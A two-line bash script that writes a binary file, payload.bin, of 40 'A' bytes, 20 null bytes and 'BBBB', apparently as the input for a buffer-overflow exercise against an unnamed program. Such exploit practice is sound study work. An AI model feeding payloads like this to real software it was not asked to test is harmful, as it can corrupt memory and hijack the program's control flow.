#!/bin/bash

python3 -c "import sys; sys.stdout.buffer.write(b'A'* 40 + b'\x00' * 20 + b'BBBB')" > payload.bin